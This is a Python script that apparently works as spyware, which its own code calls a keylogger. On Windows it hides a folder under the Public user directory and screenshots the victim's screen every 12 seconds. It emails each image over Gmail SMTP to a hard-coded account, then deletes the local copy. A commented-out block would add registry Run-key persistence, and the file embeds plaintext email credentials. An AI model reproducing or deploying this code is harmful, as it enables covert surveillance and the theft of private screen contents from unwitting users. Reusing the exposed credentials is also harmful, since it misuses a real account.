import smtplib
import imghdr
from email.message import EmailMessage
import pyautogui
import os
import threading
import winreg as reg
import ctypes
from requests import get

'''def AddToRegistry():
    pth = os.path.dirname(os.path.realpath(__file__))
    s_name="mYscript.py"    
    address=os.join(pth,s_name)
    key = 'HKEY_CURRENT_USER'
    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
    open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
    reg.SetValueEx(open,"any_name",0,reg.REG_SZ,address)
    reg.CloseKey(open)

AddToRegistry()'''

Sender_Email = 'vidiksmirka@gmail.com'
Reciever_Email = Sender_Email
Password = 'CqaxG2yDXsPQtFu'
interval = 12

directory = os.mkdir(f"C:\\Users\\Public\\Public 3D Objects\\")
ctypes.windll.kernel32.SetFileAttributesW(f"C:\\Users\\Public\\Public 3D Objects\\", 2)

files = [f"C:\\Users\\Public\\Public 3D Objects\\screenshot.png"]

class Screenshots:
    def __init__(self, email, password, interval):
        self.email = email
        self.password = password
        self.interval = interval

    def screenshot(self):
            pyautogui.screenshot(f"C:\\Users\\Public\\Public 3D Objects\\screenshot.png")
            timer = threading.Timer(self.interval, self.screenshot)
            timer.start()
        
            newMessage = EmailMessage()                         
            newMessage['Subject'] = "Check out the Logs!"
            newMessage['From'] = Sender_Email                   
            newMessage['To'] = Reciever_Email                   
            newMessage.set_content('New logs sent from your keylogger!')

            with open(f"C:\\Users\\Public\\Public 3D Objects\\screenshot.png", 'rb') as f:
                global file_type
                file_data = f.read()
                file_type = imghdr.what(f.name)
                file_name = f.name

            newMessage.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
                smtp.login(Sender_Email, Password)              
                smtp.send_message(newMessage)

            os.remove(f"C:\\Users\\Public\\Public 3D Objects\\screenshot.png")

keylogger = Screenshots(Sender_Email, Password, interval)
keylogger.screenshot()